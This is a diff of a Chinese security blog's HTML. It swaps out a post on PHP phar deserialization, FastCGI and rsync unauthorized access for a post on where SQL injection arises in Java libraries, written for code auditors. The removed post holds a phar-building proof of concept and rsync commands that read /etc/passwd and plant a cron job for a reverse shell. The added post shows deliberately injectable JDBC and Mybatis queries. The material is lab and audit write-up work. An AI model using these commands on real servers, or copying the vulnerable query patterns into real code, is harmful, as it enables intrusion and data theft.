@@ -13,11 +13,11 @@
 
     <title>
         
-          phar &amp; fastcgi &amp; rsync 漏洞小结 - Kingkk&#39;s Blog
+          SQLi in Java - Kingkk&#39;s Blog
         
     </title>
 
-    <link rel="canonical" href="https://www.kingkk/2018/10/phar-fastcgi-rsync-漏洞小结/">
+    <link rel="canonical" href="https://www.kingkk/2019/11/SQLi-in-Java/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -165,12 +165,16 @@
                 <div class="post-heading">
                     <div class="tags">
                         
+                          <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
+                        
+                          <a class="tag" href="/tags/#Java" title="Java">Java</a>
+                        
                     </div>
-                    <h1>phar &amp; fastcgi &amp; rsync 漏洞小结</h1>
+                    <h1>SQLi in Java</h1>
                     <h2 class="subheading"></h2>
                     <span class="meta">
                         Posted by kingkk on
-                        2018-10-14
+                        2019-11-21
                     </span>
                 </div>
             </div>
@@ -189,63 +193,75 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>几个简单复现了下的漏洞类型，但是又我之前没学过的。</p>
-<p>总是喜欢记录一下，但是又不想分开三篇来记录，就合到了一篇里面。</p>
-<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><p>前段时间black hat会议上新提出的一种攻击手法（但orange师傅2017年就用这个在hitcon出过题）</p>
-<p>主要是利用<code>phar://</code>协议在解析数据的时候，会触发一次<code>unserialize</code>，从而产生反序列化</p>
-<h2 id="phar文件格式"><a href="#phar文件格式" class="headerlink" title="phar文件格式"></a>phar文件格式</h2><p>文件格式里有那么几个比较重要的参数</p>
-<h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p>为一个phar的标志，格式为</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="meta">&lt;?php</span> xxx; <span class="comment"><span class="keyword">__HALT_COMPILER</span>();?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>后面必须以<code>__HALT_COMPILER();?&gt;</code>结尾，否则无法识别</p>
-<h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>会以<strong>序列化</strong>形式存储用户自定义的<code>meta-data</code></p>
-<p>也就是这块内容在解析的时候会被反序列化，从而产生反序列化漏洞</p>
-<h3 id="file-contens"><a href="#file-contens" class="headerlink" title="file contens"></a>file contens</h3><p>被压缩的文件内容</p>
-<h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>文件签名</p>
-<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>首先测试生成一个<code>phar</code>文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
-<p>主要要设置的就三个值</p>
+                <h1 id="SQLi-in-Java"><a href="#SQLi-in-Java" class="headerlink" title="SQLi in Java"></a>SQLi in Java</h1><p>SQL注入是Web安全老生常谈的一个话题，这里也没什么新的东西。 </p>
+<p>由于个人的一些需求，整理了一些Java中可能产生SQL注入的操作，做代码审计的时候可以关注一下。 不足或者错误的地方也麻烦指出。 </p>
+<h1 id="SQL操作"><a href="#SQL操作" class="headerlink" title="SQL操作"></a>SQL操作</h1><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>主要的操作就在 <code>java.sql.Statement</code> 这个接口下 </p>
 <ul>
-<li><code>setStub</code>： 一般为固定值 <code>&lt;?php __HALT_COMPILER(); ?&gt;</code>或者也可以添加一些自定义文件头之类的</li>
-<li><code>setMetadata</code>：需要反序列化的类</li>
-<li><code>addFormString</code>：文件名和文件内容可以随意填，这里文件名（这里为<code>test.txt</code>到后续需要使用</li>
+<li><p><code>java.sql.Statement.executeQuery</code> </p>
+</li>
+<li><p><code>java.sql.Statement.executeUpdate</code></p>
+</li>
+<li><p><code>java.sql.Statement.execute java.sql.Statement.addBatch</code> </p>
+</li>
+<li><p><code>java.sql.Statement.executeUpdate</code> </p>
+</li>
 </ul>
-<p>重命名为<code>1.jpg</code>，然后尝试触发</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Destruct called'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="string">'phar://1.jpg/test.txt'</span>;</span><br><span class="line">    file_exists($filename); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/2.png" alt></p>
-<p><code>test.txt</code>就是之前的文件名，成功反序列化</p>
-<p>而且可以触发的函数也比较多</p>
-<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/(phar-fastcgi-rsync-漏洞小结/1.png" alt></p>
-<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>需要注意的就是，文件存在的时候需要先删掉才能重建</p>
-<p>文件后缀必须为<code>.phar</code>，但是生成好之后可以改</p>
-<p>这样，无疑极大的拓展了反序列化的攻击面，无需强制使用<code>unserialize</code>。只要能完全控制文件名，甚至文件名的前面一部分，就可以触发反序列化。感觉触发的场景无疑多了许多，主要任务就是寻找pop chain了。</p>
-<h1 id="Fast-cgi未授权访问"><a href="#Fast-cgi未授权访问" class="headerlink" title="Fast-cgi未授权访问"></a>Fast-cgi未授权访问</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Fastcgi是一种跟高效的php与webserver之间通信的协议。</p>
-<p>PHP-FPM是一个fastcgi协议解析器，webserver将用户请求按照fastcgi的规则打包好后传给FPM。</p>
-<p>当fastcgi端口（默认为9000）暴露在公网中时，就可以伪造fastcgi协议通信内容，从而执行php</p>
-<p>当端口没有暴露的时候，也是可以通过SSRF进行攻击的</p>
-<p>具体原理和分析可以看<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>漏洞环境用p神的vulhub</p>
-<p><a href="https://github.com/vulhub/vulhub/tree/master/fpm" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fpm</a></p>
-<p>脚本</p>
-<p><a href="https://github.com/kingkaki/Exploit-scripts/blob/master/fast-cgi/fpm.py" target="_blank" rel="noopener">https://github.com/kingkaki/Exploit-scripts/blob/master/fast-cgi/fpm.py</a></p>
-<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/3.png" alt></p>
-<h1 id="rsync-未授权访问漏洞"><a href="#rsync-未授权访问漏洞" class="headerlink" title="rsync 未授权访问漏洞"></a>rsync 未授权访问漏洞</h1><blockquote>
-<p>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p>
-</blockquote>
-<p>在没有设置密码的时候，就可以任意文件读取和写入，在内网渗透的时候用处较大</p>
-<p>可以通过访问<code>/src</code>目录看到备份了的文件</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync:<span class="regexp">//</span>localhost:<span class="number">873</span><span class="regexp">/src/</span></span><br></pre></td></tr></table></figure>
-<p>或者</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">rsync</span> 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">::src</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/4.png" alt></p>
-<p>任意文件下载</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av  rsync:<span class="regexp">//</span>localhost:<span class="number">873</span><span class="regexp">/src/</span>etc<span class="regexp">/passwd ./</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/5.png" alt></p>
-<p>还可以写入文件，例如写一个定时任务，反弹shell</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av shell rsync:<span class="regexp">//</span>localhost:<span class="number">873</span><span class="regexp">/src/</span>etc<span class="regexp">/cron.d/</span>shell</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/6.png" alt></p>
-<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
-<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
-<p><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p>
+<p>应该算是一个最基础的SQL操作库。 </p>
+<h2 id="SpringJDBC"><a href="#SpringJDBC" class="headerlink" title="SpringJDBC"></a>SpringJDBC</h2><p>主要对应 <code>org.springframework.jdbc.core.JdbcTemplate</code> 这个类下的操作 </p>
+<ul>
+<li><code>org.springframework.jdbc.core.JdbcTemplate.update</code></li>
+<li><code>org.springframework.jdbc.core.JdbcTemplate.execute</code></li>
+<li><code>org.springframework.jdbc.core.JdbcTemplate.query</code></li>
+<li><code>org.springframework.jdbc.core.JdbcTemplate.queryForObject</code></li>
+<li><code>org.springframework.jdbc.core.JdbcTemplate.queryForRowSet</code></li>
+<li><code>org.springframework.jdbc.core.JdbcTemplate.queryForList</code></li>
+<li><code>org.springframework.jdbc.core.JdbcTemplate.queryForMap</code></li>
+<li><code>org.springframework.jdbc.core.JdbcTemplate.batchUpdate</code></li>
+</ul>
+<p>里面有很多重载，例如 </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jdbcTemplate.queryForObject(<span class="string">"select count(*) from user where name = '"</span> + input+ <span class="string">"'"</span>);</span><br><span class="line">jdbcTemplate.queryForObject(<span class="string">"select count(*) from user where name = ?"</span>, Integer<span class="class">.<span class="keyword">class</span>, <span class="title">input</span>)</span>;</span><br></pre></td></tr></table></figure>
+<p>其实第二种方式就是SpringJDBC的预编译，只要将值传入，就可以以预编译的方式执行SQL语句。 </p>
+<p>但假如第一个变量sql本身受到污染，也还是会存在SQL注入。 </p>
+<h2 id="JPA"><a href="#JPA" class="headerlink" title="JPA"></a>JPA</h2><p>我在网上找了半天貌似只找到一个执行原生SQL的操作，而且使用概率极低 </p>
+<ul>
+<li><code>javax.persistence.EntityManager.createNativeQuery</code></li>
+</ul>
+<p>其余常规的用法貌似都是默认预编译的形式？求了解的大佬说一下。 </p>
+<h2 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h2><p>算是使用频率比较高的一个现代化SQL操作库<br>有XML和注解两种形式 </p>
+<h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><p>这里以SpringBoot为例，XML的文件配置可以从 <code>application</code> 配置中获取 </p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mybatis.mapper-locations:</span> <span class="string">classpath:mapper/*.xml</span></span><br></pre></td></tr></table></figure>
+<p>也就是对应着mapper文件夹下的所有XML文件。 </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"com.kingkk.sql.Dao.UserDao"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"findUserByName"</span> <span class="attr">parameterType</span>=<span class="string">"String"</span> <span class="attr">resultType</span>=<span class="string">"com.kingkk.sql.Entity.User"</span>&gt;</span></span><br><span class="line">        SELECT * FROM user WHERE username = '$&#123;username&#125;'</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如上的xml就表示这个mapper对应着 <code>com.kingkk.sql.Dao.UserDao</code> 这个接口下的 findUserByName 所要执行的SQL操作 </p>
+<h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p>还有一种更方便的注解方式，可以直接注解在 <code>UserDao</code> 这个接口上 </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select</span>(<span class="string">"SELECT * FROM user WHERE username = '$&#123;username&#125;'"</span>)</span><br><span class="line"><span class="function">User <span class="title">findUserByName</span><span class="params">(@Param(<span class="string">"username"</span>)</span> String username)</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h3><p>在Mybatis中有两种占位符 </p>
+<ul>
+<li><code>#{}</code> 为预编译占位符，这种情况不会存在SQL注入 </li>
+<li><code>${}</code> 为字符串拼接占位符，本质就是字符串拼接，会存在SQL注入风险 </li>
+</ul>
+<p>所以审计时，可以寻找 ${} 占位的变量，依次溯源。 </p>
+<h2 id="Hibernate"><a href="#Hibernate" class="headerlink" title="Hibernate"></a>Hibernate</h2><p>主要对应 <code>org.hibernate.Session</code> 这个接口下的操作 </p>
+<ul>
+<li><code>org.hibernate.Session.createQuery</code></li>
+<li><code>org.hibernate.Session.createSQLQuery</code></li>
+<li><code>org.hibernate.Session.createNativeQuery</code></li>
+</ul>
+<p>Hibernate主要的操作对象其实不是SQL语句，而是HQL，但也可以执行原生SQL。 </p>
+<p>至于HQL也是可以注入的，具体的注入方法这里也就不讨论了。  </p>
+<h1 id="为什么还要字符串拼接？"><a href="#为什么还要字符串拼接？" class="headerlink" title="为什么还要字符串拼接？"></a>为什么还要字符串拼接？</h1><p>预编译算是一种能从根源上杜绝SQL注入的方式，而且几乎所有的库都支持，并且默认以预编译的方式 执行SQL语句，但是为什么还是有那么多字符串的拼接？ </p>
+<p>整理了下一些常见的情况，也是可以关注的一些点。 </p>
+<h2 id="开发基础太差"><a href="#开发基础太差" class="headerlink" title="开发基础太差"></a>开发基础太差</h2><p>这种属于低级错误，例如之前的Mybatis，开发人员并不知道 ${} 和 #{} 的区别，导致的乱用。 </p>
+<p>这种程序员写的程序可以放心不止SQL注入那么简单，但这种人属于少部分情况。 </p>
+<h2 id="预编译姿势不对"><a href="#预编译姿势不对" class="headerlink" title="预编译姿势不对"></a>预编译姿势不对</h2><p>例如使用like的时候，就经常容易出现一些SQL注入的情况。 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">'%?%'</span></span><br></pre></td></tr></table></figure>
+<p>原因是开发人员发现使用like的时候，如上的预编译方式会报错，但其实查阅官方手册之后，可以发现 是可以通过正确的姿势进行预编译的。 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="keyword">concat</span>(<span class="string">'%'</span>,?,<span class="string">'%'</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="无法预编译"><a href="#无法预编译" class="headerlink" title="无法预编译"></a>无法预编译</h2><p>对于列表和表名，是不支持预编译的，也是产生字符串拼接最多的一种情况。 </p>
+<p>对于这种确实无法预编译的情况，首先推荐通过白名单的形式，限制传入的列名/表名的范围。 </p>
+<p>并且用 <code>String.equals</code> 、<code>List.contains</code> 、<code>switch</code> 等方式进行限制内容。 </p>
+<p>假如用的是 <code>String.contains()</code> 、 <code>String.startsWith()</code> 、 <code>String.endsWith()</code> 就依旧还是会被各种绕过。 </p>
+<p>至于无法限制范围的，就要经过正确的转义了，这里又是一个大坑。。  </p>
 
 
                 <hr>
@@ -255,12 +271,12 @@
                 <ul class="pager">
                     
                         <li class="previous">
-                            <a href="/2018/10/Thinkphp-聚合查询漏洞/" data-toggle="tooltip" data-placement="top" title="ThinkPHP 聚合查询漏洞">&larr; Previous Post</a>
+                            <a href="/2019/11/Jimple-in-Soot/" data-toggle="tooltip" data-placement="top" title="Jimple in Soot">&larr; Previous Post</a>
                         </li>
                     
                     
                         <li class="next">
-                            <a href="/2018/10/护网杯-web/" data-toggle="tooltip" data-placement="top" title="护网杯-web">Next Post &rarr;</a>
+                            <a href="/2019/07/Fastjson反序列化漏洞-1-2-24-1-2-48/" data-toggle="tooltip" data-placement="top" title="Fastjson反序列化漏洞 1.2.24-1.2.48">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -287,6 +303,10 @@
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
+                          <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
+                        
+                          <a class="tag" href="/tags/#Java" title="Java">Java</a>
+                        
                     </div>
                 </section>
                 
